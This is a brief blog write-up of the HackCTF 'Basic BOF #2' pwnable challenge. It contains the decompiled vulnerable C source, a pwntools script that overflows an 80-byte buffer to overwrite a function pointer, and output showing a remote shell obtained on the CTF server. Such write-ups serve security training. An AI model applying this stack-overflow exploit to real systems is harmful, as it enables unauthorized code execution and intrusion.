---
layout: post
title: "HackCTF Basic BOF #2"
author: "Ph4nt0m"
categories: [WriteUp, Pwnable]
date: 2021-03-31 17:00
tag: [WriteUp, HackCTF, Pwnable]
---

# Basic BOF #2

## Source

```c
nt __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[80]; // [esp+Ch] [ebp-8Ch]
  void (*v5)(void); // [esp+8Ch] [ebp-Ch]

  v5 = (void (*)(void))sup;
  fgets(s, 133, stdin);
  v5();
  return 0;
}
```

## Solve

```c
from pwn import *

e = ELF("./bof_basic2")
#p = process("./bof_basic2")
r = remote("ctf.j0n9hyun.xyz", 3001)
shell = 0x804849b
payload = ''
payload += "A"*80
payload += "B"*48
payload += p32(shell)

r.sendline(payload)
r.interactive()
```

```c
➜  hackctf python bof_basic2.py
[*] '/home/ubuntu/ctf/hackctf/bof_basic2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to ctf.j0n9hyun.xyz on port 3001: Done
[*] Switching to interactive mode
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```